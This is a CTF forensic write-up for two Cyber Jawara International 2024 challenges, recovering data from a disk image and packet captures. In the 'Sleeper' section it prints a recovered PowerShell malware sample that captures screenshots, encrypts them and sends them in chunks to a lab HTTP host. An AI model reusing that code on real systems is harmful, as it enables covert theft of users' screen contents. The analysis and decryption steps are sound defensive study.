# Cyber Jawara International 2024 - Forensic Challenges
- Played with TCP1P x SNI x MAGER

## Sleeper
<img src="https://hackmd.io/_uploads/HkFeLtneyx.png" width="300" height="300">

This challenge gives us 2 distribution file which is a disk drive dump (.ad1) and a pcap file of the network traffic of the attacked device.
From the description, the chall says that we need to analyze what happened to the victim's pc.

From the given .ad1, i  mounted it using FTK and Analyze with Autopsy.
There are a .bat file but it seems has no correlation to anything, it might be an entrypoint of the malware but its just there to remove the malware.
![Screenshot 2024-10-27 092024](https://hackmd.io/_uploads/ByrHIYhl1x.png)
So, whats next? we need to find out some artifacts related to recently ran apps and installed apps.

There is an artifact named ActiviesCache.db which  is a database that stores activity history for the Windows Timeline feature, which was introduced in Windows 10. Windows Timeline lets users view and resume activities (like files opened, websites visited, or apps used) across multiple devices connected to their Microsoft account.

This artifact usually located at
``\Users\[username]\AppData\Local\ConnectedDevicesPlatform\L.<SomeID>\ActivitiesCache.db``

The database logs activities to create a timeline that users can view by pressing Windows Key + Tab. This timeline helps users quickly resume tasks or revisit activities across devices. It includes information like timestamps, application IDs, file paths, URLs, and metadata about the user's activities on that device. The data can be synchronized with other Windows devices if logged in with the same Microsoft account.

This database file we can open it with SQLite Database Viewer and then export it as csv. Here i opened the csv using Timeline Viewer
![Screenshot 2024-10-27 095217](https://hackmd.io/_uploads/SymPUt3l1g.png)
We can notice that there are some malicious execution of sconsvr.scr that we can check what is that about.

I try to search for it and found the Executable at SysWOW64, it contains this malicious powershell script
```
  function Encrypt-File {
    param (
        [string]$D783C0,
        [string]$6766A9,
        [string]$92EE28
    )

    Write-Output $6766A9
    Write-Output $92EE28

    $4099D1 = [System.Text.Encoding]::UTF8.GetBytes($6766A9)
    $68263A = [System.Text.Encoding]::UTF8.GetBytes($92EE28)

    if ($4099D1.Length -ne 16 -and $4099D1.Length -ne 24 -and $4099D1.Length -ne 32) {
        throw "ERROR"
    }
    if ($68263A.Length -ne 16) {
        throw "ERROR"
    }

    $88DB2B = New-Object "System.Security.Cryptography.AesManaged"
    $88DB2B.Key = $4099D1
    $88DB2B.IV = $68263A
    $88DB2B.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $88DB2B.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $BDAE58 = [System.IO.File]::ReadAllBytes($D783C0)

    $FF85F8 = $88DB2B.CreateEncryptor()
    $42B0F0 = $FF85F8.TransformFinalBlock($BDAE58, 0, $BDAE58.Length);
    [byte[]] $C81F44 = $88DB2B.IV + $42B0F0
    $88DB2B.Dispose()
    $res = [Convert]::ToBase64String($C81F44)
    return $res
}

# $processArray = Get-Process | Where-Object {$_.mainWindowTitle} | Select-Object ProcessName
$processArray = Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object MainWindowTitle

foreach ($process in $processArray) {
    $tmp = $process.MainWindowTitle
    $filePath = "C:\Users\Public\Pictures\tmp.png"
    $command = "C:\Windows\SysWOW64\chkmnt.exe $filepath $tmp"
    Invoke-Expression $command

    $regValue = "HKCU:\Control Panel\Desktop"
    $value = (Get-ItemProperty -Path $regValue -Name "ScreenSaveTimeout")."ScreenSaveTimeout"
    $random = [System.Random]::New($value)
    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $key = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })
    Write-Output $key

    $random = [System.Random]::New($value)
    $characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $IV = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })

    $base64Encoded = Encrypt-File $filePath $key $IV
    $base64Encoded = $base64Encoded[2]
    $chunkSize = 1024
    $totalChunks = [math]::Ceiling($base64Encoded.Length / $chunkSize)
    $baseUrl = 'http://10.21.69.4:8081'

    for ($i = 0; $i -lt $totalChunks; $i++) {
        $startIndex = $i * $chunkSize; $length = [math]::Min($chunkSize, $base64Encoded.Length - $startIndex)
        $chunk = $base64Encoded.Substring($startIndex, $length)
        $chunkUrlEncoded = [System.Net.WebUtility]::UrlEncode($chunk)
        $fullUrl = "${baseUrl}?vBRqSiWY$i=$chunkUrlEncoded"
    Write-Output $fullUrl
        $response = Invoke-RestMethod -Uri $fullUrl -Method Get
    }

    Remove-Item -Path $filePath
}
```

Its encrypt data using randomized key and IV with seed taken from the registry, send it to the baseUrl with that we can trace from the pcap file.

The data that was sent is splitted into 1024 bytes, so you need to combine it, there are pattern in the parameter here `?vBRqSiWY$i`, with i as index.

`tshark -r .\needsleeppls.pcap -Y '((ip.src == 10.21.69.8) && (_ws.col.protocol == "HTTP")) && (_ws.col.info contains "vBRqSiWY")' -T fields -e _ws.col.info | Out-File output.txt`

Script to tidy up the ct (credit to 53buahapel)
``` # tshark -r .\needsleeppls.pcap -Y '((ip.src == 10.21.69.8) && (_ws.col.protocol == "HTTP")) && (_ws.col.info contains "vBRqSiWY")' -T fields -e _ws.col.info | Out-File output1.txt -Encoding utf8

file = open('output1.txt', 'r').readlines()

# uncomment ini kalo tshark nya di windows encoding issue :sob:
file[0] = file[0][3:]

data = []

pattern = []
for i in range(0, len(file)):
    chunk_num = file[i].split('=')[0][14:]
    data.append(file[i].split('=')[1].split(" ")[0])
    if chunk_num == '0':
        pattern.append(i)

pattern.append(len(file))

patterns = []
for i in range(0, len(pattern) - 1):
    patterns.append((pattern[i], pattern[i + 1]))

result = []
for i in patterns:
    tmp = ""
    for j in range(i[0], i[1]):
        tmp += data[j]
    result.append(tmp)

for i in range(len(result)):
    open('result' + str(i) + '.txt', 'w').write(result[i])
``` 
Pcap containing encrypted packet:
``` ((ip.src == 10.21.69.8) && (_ws.col.protocol == "HTTP")) && (_ws.col.info contains "?vBRqSiWY")```
![Screenshot 2024-10-27 103125](https://hackmd.io/_uploads/rJCoLFhl1l.png)

Registry value for seed:
![Screenshot 2024-10-27 115126](https://hackmd.io/_uploads/rkY18t2e1x.png)

i take the key and iv using ps1 script and decrypt it manually using cyberchef
```
$seed = 60

$random = [System.Random]::New($seed)
$characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

$keyLength = 16
$key = -join ((1..$keyLength) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })

Write-Output "key: $key"

$IV = -join ((1..16) | ForEach-Object { $characters[$random.Next(0, $characters.Length)] })

Write-Output "iv: $IV"
```

```
key: EarWS9whYYeT2q8f
iv: FMShwjI9jHg1HYUP
```

Decryption Result:
![Screenshot 2024-10-27 115211](https://hackmd.io/_uploads/ryxfOF2xJg.png)

Remove the pad, and try to decrypt the packets until you got the flag
![5](https://hackmd.io/_uploads/S1VHdF3gke.png)


## Prepare the Tools
<img src="https://hackmd.io/_uploads/SkiwwY2l1x.png" width="500" height="300">

Upon analzyng the pcap, its clear enough we just need to reconstruct the scrambled flag
![Screenshot 2024-10-27 130656](https://hackmd.io/_uploads/BktowYhg1l.png)

```
import re

def parse_and_order_flag(file_path):
    # Read file contents
    with open(file_path, 'r') as file:
        data = file.read()

    # Extract each 'flag[number]' and the associated string using regex
    pattern = re.compile(r'flag\[(\d+)\](.)')
    matches = pattern.findall(data)

    # Convert each match to (number, character) and sort by number
    ordered_segments = sorted(matches, key=lambda x: int(x[0]))

    # Join the characters in the correct order to form the flag
    reconstructed_flag = ''.join(char for _, char in ordered_segments)
    return reconstructed_flag

#Usage
file_path = 'tools.dat'
flag = parse_and_order_flag(file_path)
print("Recovered flag:", flag)
```
![Screenshot 2024-10-27 130752](https://hackmd.io/_uploads/BJvADY3lkg.png)
